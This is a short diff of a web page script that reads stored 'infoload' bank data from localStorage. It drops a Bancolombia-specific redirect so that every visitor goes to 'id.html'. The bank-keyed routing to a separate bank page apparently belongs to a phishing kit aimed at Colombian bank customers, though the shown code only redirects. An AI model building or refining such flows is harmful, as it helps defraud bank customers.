@@ -42,20 +42,8 @@
 
   <script>
   function analizarBancoInfoload() {
-    const infoload = JSON.parse(localStorage.getItem('infoload'));
-
-    if (infoload && infoload.bank) {
-      const banco = infoload.bank.toLowerCase();
-
-      // Excepción: No redirigir si es "BANCOLOMBIA S.A.- NEQUI"
-      if (banco.includes("bancolombia") && !banco.includes("bancolombia s.a.- nequi".toLowerCase())) {
-        window.location.href = "bancol/index-pc.html";
-      } else {
-        window.location.href = "id.html"; // Redirige a id.html si no cumple la condición
-      }
-    } else {
-      window.location.href = "id.html"; // Si no hay infoload, también redirige a id.html
-    }
+    // Todos los bancos, incluyendo Bancolombia, redirigen a id.html
+    window.location.href = "id.html";
   }
 
   // Llamar a la función para realizar la redirección después de un breve tiempo
